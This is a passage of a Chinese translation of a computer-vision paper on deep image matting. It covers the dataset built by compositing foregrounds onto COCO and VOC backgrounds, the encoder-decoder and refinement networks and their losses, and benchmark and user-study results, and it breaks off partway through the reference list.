+<p>为了训练我们的抠图网络，我们通过将真实图像中的对象合成到新的背景来创建更大的数据集。我们在简单的背景上找到图像（图 <a href="#2">2</a>.a），包括来自 <sup><a href="#fn_25" id="reffn_25">25</a></sup> 的 27 个训练图像和来自 <sup><a href="#fn_26" id="reffn_26">26</a></sup> 的视频的每五个帧。使用 PhotoShop 我们手动创建了 <script type="math/tex">α</script> 蒙版（alpha matte）（图 <a href="#2">2</a>. b）和纯前景图像（图 <a href="#2">2</a>. c）。因为这些对象具有简单的背景，所以我们可以为他们提供准确的蒙版。然后我们将这些作为基本的标准结果（ground truth），对于每个 <script type="math/tex">α</script> 蒙版和前景图像，我们在 MS COCO <sup><a href="#fn_23" id="reffn_23">23</a></sup> 和 Pascal VOC <sup><a href="#fn_11" id="reffn_11">11</a></sup> 中随机抽取 N 个背景图像，并将对象合成到这些背景图像上。</p>
+<p>我们使用上述方法创建了训练数据集和测试数据集。我们的训练数据集拥有 493 个独特的前景对象和 49300 个图像（N = 100），而我们的测试数据集有 50 个独立对象和 1000 个图像（N = 20）。每个图像的三分图从其真实的 <script type="math/tex">α</script> 蒙版中随机膨胀（dilate）而成。与之前的抠图数据集相比，我们的新数据集有以下几个优点：1) 它拥有更多的独特的对象，并涵盖各种抠图的情况，如毛发、毛皮、半透明度等。2) 许多合成图像具有相似的前景色和背景色以及复杂的背景纹理，使我们的数据集更具有挑战性和使用性。</p>
+<p>一个早期的问题是，由于图像的合成性质，这个过程是否会产生偏差，因此网络应学会关注前景和背景亮度、噪声水平等的差异。然而，我们通过实验发现，与现有方法相比，我们在自然图像上获得了更好的结果（见 <a href="#5.3">5.3</a> 节）。</p>
+<h2 id="4-我们的方法"><a href="#4-我们的方法" class="headerlink" title="4. 我们的方法"></a>4. 我们的方法</h2><p>我们使用深度学习来解决抠图问题。鉴于我们的新数据集，我们训练一个神经网络以充分利用数据。该网络有两个阶段组成（图 <a href="#3">3</a>）。第一阶段是深度卷积编码-解码器网络，它采用图像小块（image patch）和三分图作为输入，并且因为 <script type="math/tex">α</script> 预测损失和新的（组合损失compositional loss）而有不利之处。第二阶段是一个小的全卷积网络，它以更准确的 alpha 值和更清晰的边缘完善了第一个网络的 alpha 预测。我们将在以下各节中详细描述我们的算法。</p>
+<p><img src="https://miao.su/images/2019/03/13/1552372427134b4b5c.png" alt></p>
+<blockquote>
+<p>图 <a href="#3">3</a>. 我们的网络包含两个阶段，一个是编码器-解码器阶段（<a href="#4.1">4.1</a>节），一个是精炼阶段（<a href="#4.2">4.2</a>节）</p>
+</blockquote>
+<h3 id="4-1-抠图编码器-解码器阶段（Matting-encoder-decoder-stage）"><a href="#4-1-抠图编码器-解码器阶段（Matting-encoder-decoder-stage）" class="headerlink" title="4.1. 抠图编码器-解码器阶段（Matting encoder-decoder stage）"></a><a href="#4.1">4.1</a>. 抠图编码器-解码器阶段（Matting encoder-decoder stage）</h3><p>我们的第一阶段是一个深度编码-解码器网络（参见图 <a href="#3">3</a>.），它在许多其他计算机视觉任务中取得了成功，例如图像分割 <sup><a href="#fn_2" id="reffn_2">2</a></sup>，边缘预测<sup><a href="#fn_33" id="reffn_33">33</a></sup>和孔填充（hole filling）<sup><a href="#fn_24" id="reffn_24">24</a></sup>。</p>
+<p><strong>网络结构（Network structure）：</strong></p>
+<p>网络的输入时一个图像小块和相应的三分图，它们沿着通道维度连接，产生 4 通道输入。整个网络由编码器网络和解码器网络组成。通过后续卷积层和最大池化层将编码器网络的输入转化为下采样特征图（feature map）。解码器网络一次使用后续的反池化层来反转最大池化操作和卷积层来对特征映射进行上采样，并具有所需的输出，在我们的例子中是 alpha 蒙版。具体来说，我们的编码器网络有 14 个卷积层和 5 个最大池化层。对于解码器网络，我们使用比编码器网络更小的结构来减少参数数量并加快训练过程。具体来说，我们的解码器网络有 6 个卷积层，5 个反卷积层，后面是最终的 alpha 预测层。</p>
+<p><strong>损失（Losses）：</strong></p>
+<p>我们的网络利用了两次损失。第一个损失称为 <strong>alpha 预测损失（alpha-prediction loss）</strong>，即数据真值 alpha 值与每个像素的预测 alpha 值之间的绝对差值。但是，由于绝对值的不可微分性，我们使用以下损失函数来近似它。</p>
+<script type="math/tex; mode=display">
+\mathcal{L}_α^i = \sqrt{(α_p^i-α_g^i)^2 + \epsilon^2} ，\ \ \ \ α_p^i,α_g^i \in [0,1] \tag{2}</script><p>其中 <script type="math/tex">α_p^i</script> 是预测层在阈值化为 0 到 1 之间的像素 <script type="math/tex">i</script> 处的输出。<script type="math/tex">\alpha_g^i</script> 是像素 <script type="math/tex">i</script> 数据真值的 alpha 值。<script type="math/tex">\epsilon</script> 是一个很小的值，在我们的实验中等于 <script type="math/tex">10^{-6}</script> 。导数 <script type="math/tex">\frac{\partial \mathcal{L}\_\alpha^i}{\partial \alpha\_p^i}</script> 如下。</p>
+<script type="math/tex; mode=display">
+\frac{\partial \mathcal{L}_\alpha^i}{\partial \alpha_p^i} = \frac{α_p^i-α_g^i}{\sqrt{(α_p^i-α_g^i)^2 + \epsilon^2}} \tag{3}</script><p>第二个损失被称为<strong>合成损失（compositional loss）</strong>，它是数据真值的 RGB 颜色和由数据真值前景、背景和合成的 alpha 蒙版预测的 RGB 颜色之间的绝对差值。同样，我们可以使用以下损失函数来近似它。</p>
+<script type="math/tex; mode=display">
+\mathcal{L}_c^i = \sqrt{(c_p^i - c_g^i)^2 + \epsilon^2} \tag{4}</script><p>其中 <script type="math/tex">c</script> 表示 RGB 通道，<script type="math/tex">p</script> 表示由预测的 alpha 合成的图像，<script type="math/tex">g</script> 表示由数据真值 alpha 构成的图像。组合损失（compositional loss）限制网络遵循组合操作（compositional operation），使得 alpha 预测更加准确。</p>
+<p>总损失是两个损失的加权求和，即 <script type="math/tex">\mathcal{L}_overall = {w_l} \cdot {\mathcal{L}_\alpha} + (1 - w_l) \cdot {\mathcal{L}_c}</script> ，其中 <script type="math/tex">w_l</script> 在我们的实验中设置为 <script type="math/tex">0.5</script> 。此外，因为只需要推断三分图未知区域的 alpha 值，所以我们根据像素位置对两种类型的损失设置额外的权重，这可以帮助我们的网络更注重于重要区域。具体地，如果像素 <script type="math/tex">i</script> 在三分图的未知区域内，则 <script type="math/tex">w_i = 1</script> ，否则 <script type="math/tex">w_i = 0</script> 。</p>
+<p><strong>实现（Implementation）：</strong></p>
+<p>虽然我们的训练数据集有 49300 个图像，但只有 493 个唯一对象。为了避免过拟合以及更有效的利用训练数据，我们使用了一些训练策略。首先，我们以未知区域中的像素为中心随机裁剪为 <script type="math/tex">320\times320 \ (image, trimap)</script> 。这增加了我们的采样空间。其次，我们还裁剪了不同尺寸的训练对（例如：<script type="math/tex">480\times480 , 640\times640</script>）并将其调整为 <script type="math/tex">320\times320</script> 。这使得我们的方法在扩展方面更加健壮，并有助于网络更好的学习上下文和语义。第三，在每个训练对上随机进行翻转（flipping）。第四，三分图从它们的数据真值 alpha 蒙版（ground truth alpha mattes）中随机扩张，帮助我们的模型对三分图的放置（placement）更稳健。最后，在每个训练周期结束后随机重建训练输入。</p>
+<p>网络的编码器部分是用 VGG-16 <sup><a href="#fn_30" id="reffn_30">30</a></sup> 的前 14 个卷积层初始化的（第 14 层是全连接层 “fc6” ，可以转换为卷积层）由于网络具有 4 通道输入，我们用全零初始化第一层卷积滤波器的一个额外通道。所有解码器参数都用 Xavier 随机初始化。</p>
+<p>测试时，图像和相应的三分图作为输入串联。执行网络的前向传播以输出 alpha 蒙版预测。当 GPU 内存不足以容纳大图像时，可以执行 CPU 测试。</p>
+<h3 id="4-2-抠图细化阶段（Matting-refinement-stage）："><a href="#4-2-抠图细化阶段（Matting-refinement-stage）：" class="headerlink" title="4.2. 抠图细化阶段（Matting refinement stage）："></a><a href="#4.2">4.2</a>. 抠图细化阶段（Matting refinement stage）：</h3><p>尽管来自我们网络第一部分的 alpha 预测已经比现有的抠图算法好得多，但由于编码器-解码器结构，结果有时过于平滑。因此，我们扩展我们的网络以进一步完善第一部分的结果。这种扩展的网络通常可以预测更准确的 alpha 蒙版和更清晰的边缘。</p>
+<p><strong>网络结构（Network structure）：</strong></p>
+<p>我们网络的第二阶段的输入是图像小块（image patch）与第一阶段的 alpha 预测（在 0 到 255 之间缩放）的串联，从而产生四通道输入。输出是相应的相应的数据真值（ground truth）的 alpha 蒙版。该网络是一个完全卷积网络，包括 4 个卷积层。前三个卷积层中的每个后面是非线性 ReLU 层。没有下采样层，因为我们希望保留第一阶段中非常细微的结构。此外，我们使用了 ”skip-model“ 结构，其中输入数据的第 4 个通道首先在 0 到 1 之间缩放（scaled），然后在网络的输出上添加。详细配置如图 3 所示。</p>
+<p>我们的细化阶段的效果如图 4 所示。注意，它不会对 alpha 蒙版进行大规模更改，而只是细化和锐化 alpha 值。</p>
+<p><img src="https://miao.su/images/2019/03/13/155237991322231706.png" alt></p>
+<blockquote>
+<p>图 <a href="#4">4</a>. 我们抠图细化网络的影响。(a) 输入图像。(b) 编码器-解码器阶段结果。(c) 抠图细化层结果。</p>
+</blockquote>
+<p><strong>实现（Implementation）：</strong></p>
+<p>在训练期间，我们首先更新编码器-解码器部分而不使用细化部分。在编码器-解码器部分收敛之后，我们修复其参数，然后更新细化部分。由于其结构简单，仅使用 alpha 预测损失（公式 <script type="math/tex">2</script>）。除第 4 阶段外，我们还使用了第 1 阶段的所有训练策略。在细化部分也收敛之后，最后我们一起微调整个网络。我们使用 Adam <sup><a href="#fn_20" id="reffn_20">20</a></sup> 来更新这两个部分。较小的学习率 <script type="math/tex">10^{-5}</script>​ 在训练过程中不断被设置。</p>
+<p>测试时，输入图像和对应的三分图，我们的算法首先使用抠图网络的编码器-解码器阶段来获得初始的 alpha 蒙版预测。然后将图像和 alpha 蒙版预测连接作为细化阶段的输入以产生最终的 alpha 蒙版预测。</p>
+<h2 id="5-实验结果"><a href="#5-实验结果" class="headerlink" title="5. 实验结果"></a>5. 实验结果</h2><p>在本节，我们将在 3 个数据集上评估我们的方法。1）在抠图方法的现有基准 <a href="http://alphamatting.com/" target="_blank" rel="noopener">alphamatting.com</a> 数据集 <sup><a href="#fn_25" id="reffn_25">25</a></sup> 上评估。它包括 8 个测试图像，每个图像有 3 个不同的三分图，即 “small” 、”large” 和 “user” 。2）由于 <a href="http://alphamatting.com/" target="_blank" rel="noopener">alphamatting.com</a> 数据集中对象的大小和范围有限，我们建议使用 Composition-1k 测试集。我们基于 Composition 的数据集包含 1000 张图像和 50 个独特的前景。此数据集具有更广泛的对象类型和背景场景。3）为了测试我们的方法在自然图像上的表现，我们还收集了包括 31 个自然图像的第三个数据集。自然图像涵盖了广泛的常见抠图前景，比如人、动物等。</p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>Methods</th>
+<th>SAD</th>
+<th>MSE</th>
+<th>Gradient</th>
+<th>Connectivity</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Shared Matting <sup><a href="#fn_13" id="reffn_13">13</a></sup></td>
+<td>128.9</td>
+<td>0.091</td>
+<td>126.5</td>
+<td>135.3</td>
+</tr>
+<tr>
+<td>Learning Based Matting <sup><a href="#fn_34" id="reffn_34">34</a></sup></td>
+<td>113.9</td>
+<td>0.048</td>
+<td>91.6</td>
+<td>122.2</td>
+</tr>
+<tr>
+<td>Comprehensive Sampling <sup><a href="#fn_28" id="reffn_28">28</a></sup></td>
+<td>143.8</td>
+<td>0.071</td>
+<td>102.2</td>
+<td>142.7</td>
+</tr>
+<tr>
+<td>Global Matting <sup><a href="#fn_16" id="reffn_16">16</a></sup></td>
+<td>133.6</td>
+<td>0.068</td>
+<td>97.6</td>
+<td>133.3</td>
+</tr>
+<tr>
+<td>Closed-Form Matting <sup><a href="#fn_22" id="reffn_22">22</a></sup></td>
+<td>168.1</td>
+<td>0.091</td>
+<td>126.9</td>
+<td>167.9</td>
+</tr>
+<tr>
+<td>KNN Matting <sup><a href="#fn_5" id="reffn_5">5</a></sup></td>
+<td>175.4</td>
+<td>0.103</td>
+<td>124.1</td>
+<td>176.4</td>
+</tr>
+<tr>
+<td>DCNN Matting <sup><a href="#fn_8" id="reffn_8">8</a></sup></td>
+<td>161.4</td>
+<td>0.087</td>
+<td>115.1</td>
+<td>161.9</td>
+</tr>
+<tr>
+<td>——————</td>
+<td>——-</td>
+<td>——-</td>
+<td>————</td>
+<td>——————</td>
+</tr>
+<tr>
+<td><em>Encoder-Decoder   network</em>   <em>(single   alpha prediction loss)</em></td>
+<td>59.6</td>
+<td>0.019</td>
+<td>40.5</td>
+<td>59.3</td>
+</tr>
+<tr>
+<td><em>Encoder-Decoder   network</em></td>
+<td>54.6</td>
+<td>0.017</td>
+<td>36.7</td>
+<td>55.3</td>
+</tr>
+<tr>
+<td><em>Encoder-Decoder   network + Guided filter</em><sup><a href="#fn_17" id="reffn_17">17</a></sup></td>
+<td>52.2</td>
+<td>0.016</td>
+<td><strong>30.0</strong></td>
+<td>52.6</td>
+</tr>
+<tr>
+<td><em>Encoder-Decoder   network + Refinement network</em></td>
+<td><strong>50.4</strong></td>
+<td><strong>0.014</strong></td>
+<td>31.0</td>
+<td><strong>50.8</strong></td>
+</tr>
+</tbody>
+</table>
+</div>
+<blockquote>
+<p><a href="#表1">表 1</a>. Composition-1k 测试数据集的定量结果。我么的方法的变体以斜体强调。最佳的结果以粗体强调。</p>
+</blockquote>
+<h3 id="5-1-alphamatting-com-数据集"><a href="#5-1-alphamatting-com-数据集" class="headerlink" title="5.1. alphamatting.com 数据集"></a>5.1. <a href="http://alphamatting.com/" target="_blank" rel="noopener">alphamatting.com</a> 数据集</h3><p>与 <a href="http://alphamatting.com/" target="_blank" rel="noopener">alphamatting.com</a> 基准测试中的所有其他方法相比，我们的方法取得了最佳结果。具体来说，我们的方法在 SAD 指标方面排名第一。对于具有 3 个三分图的 5 个图像（图 <a href="#5">5</a>.），我们的方法也具有最小的 SAD 误差。此外，我们的方法在 MSE 和 Gradient 指标方面排名第二。总的来说，我们的方法是该数据集中表现最佳的方法之一。</p>
+<p>我们成功的一个关键原因是我们的网络学习结构和语义的能力，这对于在背景场景复杂或背景和前景色相似时准确估计 alpha 蒙版非常重要。例如，在图 <a href="#6">6</a> 中，”Troll” 实例具有非常相似的头发和桥的颜色，而 “Doll” 实例具有强烈的纹理背景。以前方法的最佳结果（从第 3 列到第 6 列）在这些硬区域都有明显的错误。相比之下，我们的方法直接学习对象结构和图像上下文。因此，我们的方法不仅避免了以前方法所犯的类似错误，而且还预测了更过细节。值得注意的时，虽然 DCNN matting <sup><a href="#fn_8" id="reffn_8">8</a></sup> 也是一种基于深度学习的方法，它学习了小型局部先前具有小型局部补丁的抠图方法的分线性组合（it learns the non-linear combination of previous matting methods within small local patches）。因此，该方法不能真正理解语义，因此具有与先前的非基于深度学习的方法相同的限制。</p>
+<p><img src="https://miao.su/images/2019/03/13/1552392001716977c3.png" alt></p>
+<blockquote>
+<p>图 <a href="#5">5</a>. alphamatting.com 数据集上的 SAD 结果。展示了前五个方法。我们的方法用红框强调。</p>
+</blockquote>
+<p><img src="https://miao.su/images/2019/03/13/155239233423197481.png" alt="Troll"><img src="https://miao.su/images/2019/03/13/1552392382192d4998.png" alt="Ours"><img src="https://miao.su/images/2019/03/13/155239239608952146.png" alt="Local-Sampling"><img src="https://miao.su/images/2019/03/13/1552392408598fb05f.png" alt="TSPS-RV"><img src="https://miao.su/images/2019/03/13/15523924257746ddd9.png" alt="CSC"><img src="https://miao.su/images/2019/03/13/1552392440095e5bf4.png" alt="DCNN"></p>
+<p><img src="https://miao.su/images/2019/03/13/1552392578792b84c6.png" alt="Doll"><img src="https://miao.su/images/2019/03/13/1552392592015c7238.png" alt="Ours"><img src="https://miao.su/images/2019/03/13/15523926030398e34a.png" alt="DCNN"><img src="https://miao.su/images/2019/03/13/15523926142868c7ce.png" alt="LNSP"><img src="https://miao.su/images/2019/03/13/15523926259836c4b0.png" alt="KL-Divergence"><img src="https://miao.su/images/2019/03/13/155239263790389b01.png" alt="Iterative"></p>
+<blockquote>
+<p>图 <a href="#6">6</a>. 测试图像的alpha蒙版预测，其中”Troll“三分图为”user“，”Doll“三分图为”small“。第一列显示测试图像。对于每个测试图像，从第２列到第６列显示了在SAD度量下的第一名到第五名。在两个例子中，我们的方法都时最佳结果。</p>
+<p>Local-Sampling<sup><a href="#fn_6" id="reffn_6">6</a></sup> TSPS-RV<sup><a href="#fn_1" id="reffn_1">1</a></sup> CSC<sup><a href="#fn_12" id="reffn_12">12</a></sup> DCNN<sup><a href="#fn_8" id="reffn_8">8</a></sup> LNSP<sup><a href="#fn_7" id="reffn_7">7</a></sup> KL-Divergence<sup><a href="#fn_19" id="reffn_19">19</a></sup> Iterative<sup><a href="#fn_15" id="reffn_15">15</a></sup></p>
+</blockquote>
+<h3 id="5-2-Composition-1k-测试数据集"><a href="#5-2-Composition-1k-测试数据集" class="headerlink" title="5.2. Composition-1k 测试数据集"></a>5.2. Composition-1k 测试数据集</h3><p>我们在 Composition-1k 测试数据集上进一步评估了 7 种先前表现最佳的方法和我们方法的每个组成部分。对于先前的方法，使用作者提供的代码。我们方法的不同变体包括：抠图编码器-解码器网络 1）只有 alpha 预测损失，2）包含 alpha 预测损失和组合损失（compositional loss），抠图编码器-解码器网络 3）由 Guided filter<sup><a href="#fn_17" id="reffn_17">17</a></sup> 后处理（post-processed）和 4）抠图细化网络（matting refinement network）后处理。</p>
+<p>[25] 中提出的 SAD，MSE，Gradient 和 Connectivity 误差下的定量结果显示在表 1 中。显然我们方法的所有变体都比其他方法有更好的结果。主要原因仍然是我们的深度模型能够理解图像的复杂背景，而其他方法则无法理解。通过比较我们方法的变体，我们还可以验证我们方法的每个组成部分的有效性：1）组合损失（compositional loss）有助于我们的模型学习组合操作（compositional operation），从而产生更好的结果，2）通过与先前的 edge-preserving filter（例如：Guided filter<sup><a href="#fn_17" id="reffn_17">17</a></sup>）以及我们的抠图细化网络相结合，可以改善我们的抠图编码器-解码器网络的结果。但是，后者在视觉上和数量上都有更明显的改进，因为它直接用我们的编码器-解码器网络的输出进行训练。</p>
+<p>我们在图 7 中测试了我们的方法对三分图放置（placement）的灵敏度。我们对数据集的一个子集进行评估，其中包括每个唯一对象的一个随机选择的图像，总共 50 个图像。为了形成三分图，我们将每个图像的数据真值（ground truth）alpha扩展 <script type="math/tex">d</script> 个像素以增加 <script type="math/tex">d</script> 的值。特定参数 <script type="math/tex">d</script> 处的 SAD 误差是在所有图像上的平均。参数 <script type="math/tex">d\in[1,4,7,10,13,16,19]</script> 的所有方法的结果如图 7 所示。显然，我们的方法具有低且稳定的错误率，随着 <script type="math/tex">d</script> 值的增加，而其他方法的错误率迅速增加。我们的良好表现源于我们的训练策略以及对图像语义的良好理解。</p>
+<p><img src="https://miao.su/images/2019/03/13/15523994212486ce95.png" alt></p>
+<blockquote>
+<p>图 <a href="#7">7</a>. 不同水平三分图扩张的 SAD 误差。</p>
+</blockquote>
+<p>图 <a href="#8">8</a> 显示了一些可见的例子，表明我们的方法在不同的抠图情况下的良好表现，如头发、洞和半透明。此外，我们的方法还可以处理没有纯前景像素的对象，如图 <a href="#8">8</a> 中的最后一个实例所示。由于先前基于采样和基于传播的方法必须利用已知的前景和背景像素，因此它们无法处理这种情况，而我们的方法可以直接从数据中学习精细细节的外观。</p>
+<p><img src="https://miao.su/images/2019/03/13/15524000053679b0b5.png" alt></p>
+<blockquote>
+<p>图 <a href="#8">8</a>. Compositional-1k 测试数据集的视觉比较结果。“Ours-raw”表明了我们的抠图编码器-解码器阶段的结果，而“Ours-refined”表明了我们的精细化阶段的结果。</p>
+</blockquote>
+<h3 id="5-3-真实图像数据集"><a href="#5-3-真实图像数据集" class="headerlink" title="5.3. 真实图像数据集"></a><a href="#5.3">5.3</a>. 真实图像数据集</h3><p>抠图方法应该能够很好的扩展到真实世界的图像。为了验证我们的方法和其他方法在真实图像上的性能我们对真实图像数据集进行了用户研究。这些图像包括从互联网上提取的图像以及 ICCV 2013 教程中关于抠图的图像。</p>
+<p>因为我们的受试者可能不熟悉 alpha 蒙版，所以我们改为评估组合物的结果。对于每种方法，计算的 alpha 蒙版用于混合测试图像到黑色背景上和白色背景上。对于用户测试，我们向用户呈现图像和两个随机选择的方法的两个合成结果，并询问那些结果更准确和更真实，尤其是在精细细节的区域（例如头发、对象的边缘和半透明区域）。为了避免评估误差，我们在 Amazon Mechanical Turk 上进行用户研究。结果，共有 392 个用户参与用户研究，并且一个图像上的每个方法对由 5 到 6 个唯一用户评估。</p>
+<p>成对比较结果显示在表 2 中，其中，每列显示一种优于其他方法的方法。例如，用户 83.7% 的时间更喜欢我们的结果对于 <sup><a href="#fn_13" id="reffn_13">13</a></sup> 。值得注意的是，近五分之四的用户更喜欢我们的方法超过现有的方法，这很好地证明了我们的方法确实产生了更好的视觉效果。有关视觉效果，参见图 <a href="#9">9</a> 。</p>
+<p><img src="https://miao.su/images/2019/03/13/15524023237505c1e7.png" alt></p>
+<blockquote>
+<p>图 <a href="#9">9</a>. 我们的真实图像数据集的示例结果。</p>
+</blockquote>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>Methods</th>
+<th>[13]</th>
+<th>[34]</th>
+<th>[28]</th>
+<th>[16]</th>
+<th>[22]</th>
+<th>[5]</th>
+<th>[8]</th>
+<th>Ours</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Shared <sup><a href="#fn_13" id="reffn_13">13</a></sup></td>
+<td>-</td>
+<td>60.0</td>
+<td><strong>78.5</strong></td>
+<td><strong>79.6</strong></td>
+<td>69.7</td>
+<td>40.6</td>
+<td><strong>57.8</strong></td>
+<td><strong>83.7</strong></td>
+</tr>
+<tr>
+<td>Learning <sup><a href="#fn_34" id="reffn_34">34</a></sup></td>
+<td>40.0</td>
+<td>-</td>
+<td><strong>60.2</strong></td>
+<td><strong>54.6</strong></td>
+<td><strong>53.4</strong></td>
+<td>27.3</td>
+<td>35.1</td>
+<td><strong>83.6</strong></td>
+</tr>
+<tr>
+<td>Comprehensive <sup><a href="#fn_28" id="reffn_28">28</a></sup></td>
+<td>21.5</td>
+<td>39.8</td>
+<td>-</td>
+<td>25.8</td>
+<td>43.3</td>
+<td>20.4</td>
+<td>29.2</td>
+<td><strong>78.8</strong></td>
+</tr>
+<tr>
+<td>Global <sup><a href="#fn_16" id="reffn_16">16</a></sup></td>
+<td>20.4</td>
+<td>45.4</td>
+<td><strong>74.2</strong></td>
+<td>-</td>
+<td><strong>53.3</strong></td>
+<td>30.0</td>
+<td>42.0</td>
+<td><strong>84.2</strong></td>
+</tr>
+<tr>
+<td>Closed-Form<sup><a href="#fn_22" id="reffn_22">22</a></sup></td>
+<td>30.3</td>
+<td>46.6</td>
+<td><strong>56.7</strong></td>
+<td>46.7</td>
+<td>-</td>
+<td>25.0</td>
+<td>38.1</td>
+<td><strong>80.4</strong></td>
+</tr>
+<tr>
+<td>KNN<sup><a href="#fn_5" id="reffn_5">5</a></sup></td>
+<td><strong>59.4</strong></td>
+<td><strong>72.7</strong></td>
+<td><strong>79.6</strong></td>
+<td>70.0</td>
+<td><strong>75.0</strong></td>
+<td>-</td>
+<td><strong>73.3</strong></td>
+<td><strong>97.0</strong></td>
+</tr>
+<tr>
+<td>DCNN <sup><a href="#fn_8" id="reffn_8">8</a></sup></td>
+<td>42.2</td>
+<td><strong>64.9</strong></td>
+<td>70.8</td>
+<td><strong>58.0</strong></td>
+<td><strong>61.9</strong></td>
+<td>26.7</td>
+<td>-</td>
+<td><strong>83.7</strong></td>
+</tr>
+<tr>
+<td>Ours</td>
+<td>16.3</td>
+<td>16.4</td>
+<td>21.2</td>
+<td>15.8</td>
+<td>19.6</td>
+<td>3.0</td>
+<td>16.3</td>
+<td>-</td>
+</tr>
+</tbody>
+</table>
+</div>
+<p>同样值得注意的是，与其他两种实验相比，本实验中的其他方法的排名不同。例如，Closed-Form Matting <sup><a href="#fn_22" id="reffn_22">22</a></sup> 是我们在 <a href="http://alphamatting.com/" target="_blank" rel="noopener">alphamatting.com</a> 数据集上比较的方法中排名最低的，但对用户来说，它比除我们和 <sup><a href="#fn_28" id="reffn_28">28</a></sup> 的其他所有方法更可取。另一方面，尽管 DCNN <sup><a href="#fn_8" id="reffn_8">8</a></sup> 是先前在 <a href="http://alphamatting.com/" target="_blank" rel="noopener">alphamatting.com</a> 上最先进的方法，但在真实图像上仅优于两种方法。目前还不清楚这究竟是由于方法过度拟合了 <a href="http://alphamatting.com/" target="_blank" rel="noopener">alphamatting.com</a> 数据集，还是标准错误指标未能准确衡量人类对 alpha 蒙版结果的感知判断。</p>
+<h2 id="6-结论"><a href="#6-结论" class="headerlink" title="6. 结论"></a>6. 结论</h2><p>为了推广到自然图像，抠图算法必须避免使用颜色作为抠图的主要依据，并利用更多的结构和语义特征。在这项工作中，我们展示了神经网络能够捕获这样的高阶特征并应用它们来计算更好的抠图结果。我们的实验表明，我们的方法不仅优于标准数据集上的先前的方法，而且能够更好的推广到真实图像。</p>
+<h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><blockquote id="fn_1">
+<sup>1</sup>. A. Al-Kabbany and E. Dubois. Matting with sequential pair selection using graph transduction. In <em>21st International Symposium on Vision, Modeling, and Visualization</em>, 2016. 6<a href="#reffn_1" title="Jump back to footnote [1] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_2">
+<sup>2</sup>. V. Badrinarayanan, A. Handa, and R. Cipolla. Segnet: A deep convolutional encoder-decoder architecture for robust semantic pixel-wise labelling. <em>arXiv preprint arXiv:1505.07293</em>, 2015. 3<a href="#reffn_2" title="Jump back to footnote [2] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_3">
+<sup>3</sup>. A. Berman, A. Dadourian, and P. Vlahos. Method for removing from an image the background surrounding a selected object, Oct. 17 2000. US Patent 6,134,346. 1, 2<a href="#reffn_3" title="Jump back to footnote [3] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_4">
+<sup>4</sup>. D. J. Butler, J. Wulff, G. B. Stanley, and M. J. Black. A naturalistic open source movie for optical flow evaluation. In <em>Proceedings of the European Conference on Computer Vision</em>, 2012. 2<a href="#reffn_4" title="Jump back to footnote [4] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_5">
+<sup>5</sup>. Q. Chen, D. Li, and C.-K. Tang. Knn matting. <em>IEEE transactions on pattern analysis and machine intelligence</em>, 35(9):2175–2188, 2013. 2, 5, 7, 8<a href="#reffn_5" title="Jump back to footnote [5] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_6">
+<sup>6</sup>. X. Chen and F. He. A propagation matting method based on the local sampling and knn classification with adaptive feature space. <em>Journal of Computer-Aided Design and Computer Graphics</em>, 2016. 6<a href="#reffn_6" title="Jump back to footnote [6] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_7">
+<sup>7</sup>. X. Chen, D. Zou, S. Zhiying Zhou, Q. Zhao, and P. Tan. Image matting with local and nonlocal smooth priors. In <em>Proceedings of the IEEE Conference on Computer Vision and Pattern Recognition</em>, pages 1902–1907, 2013. 2, 6<a href="#reffn_7" title="Jump back to footnote [7] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_8">
+<sup>8</sup>. D. Cho, Y.-W. Tai, I. Kweon, D. Cho, Y.-W. Tai, and I. Kweon. Natural image matting using deep convolutional neural networks. In <em>Proceedings of the European Conference on Computer Vision</em>, 2016. 1, 2, 5, 6, 7, 8<a href="#reffn_8" title="Jump back to footnote [8] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_9">
+<sup>9</sup>. Y.-Y. Chuang, B. Curless, D. H. Salesin, and R. Szeliski. A bayesian approach to digital matting. In <em>Computer Vision and Pattern Recognition, 2001. CVPR 2001. Proceedings of the 2001 IEEE Computer Society Conference on</em>, volume 2, pages II–264. IEEE, 2001. 1, 2<a href="#reffn_9" title="Jump back to footnote [9] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_10">
+<sup>10</sup>. M. Erofeev, Y. Gitman, D. Vatolin, A. Fedorov, and J. Wang. Perceptually motivated benchmark for video matting. In <em>Proceedings of the British Machine Vision Conference (BMVC)</em>, 2015. 1<a href="#reffn_10" title="Jump back to footnote [10] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_11">
+<sup>11</sup>. M. Everingham, L. Van Gool, C. K. Williams, J. Winn, and A. Zisserman. The pascal visual object classes (voc) challenge. <em>International journal of computer vision</em>, 88(2):303– 338, 2010. 3<a href="#reffn_11" title="Jump back to footnote [11] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_12">
+<sup>12</sup>. X. Feng, X. Liang, and Z. Zhang. A cluster sampling method for image matting via sparse coding. In <em>European Conference on Computer Vision</em>, pages 204–219. Springer, 2016. 2, 6<a href="#reffn_12" title="Jump back to footnote [12] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_13">
+<sup>13</sup>. E. S. Gastal and M. M. Oliveira. Shared sampling for realtime alpha matting. In <em>Computer Graphics Forum</em>, volume 29, pages 575–584. Wiley Online Library, 2010. 1, 2, 5, 7, 8<a href="#reffn_13" title="Jump back to footnote [13] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_14">
+<sup>14</sup>. L. Grady, T. Schiwietz, S. Aharon, and R. Westermann. Random walks for interactive alpha-matting. In <em>Proceedings of VIIP</em>, volume 2005, pages 423–429, 2005. 1, 2<a href="#reffn_14" title="Jump back to footnote [14] in the text."> &#8617;</a>
+</blockquote>
+<blockquote id="fn_15">
